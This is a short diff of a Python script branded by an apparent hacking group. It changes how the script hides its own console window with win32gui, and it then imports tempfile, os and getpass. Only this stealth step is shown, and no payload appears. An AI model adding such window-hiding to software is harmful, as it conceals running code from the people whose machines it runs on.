@@ -3,9 +3,10 @@
 # FB: http://www.facebook.com/xrn401
 #   =>DebutySecTeamSecurity<=
 #conding: utf-8
-import win32console, win32gui
-window = win32console.GetConsoleWindow()
-win32gui.ShowWindow(window,0)
+
+import win32gui, win32con
+The_program_to_hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
 import tempfile
 import os
 import getpass
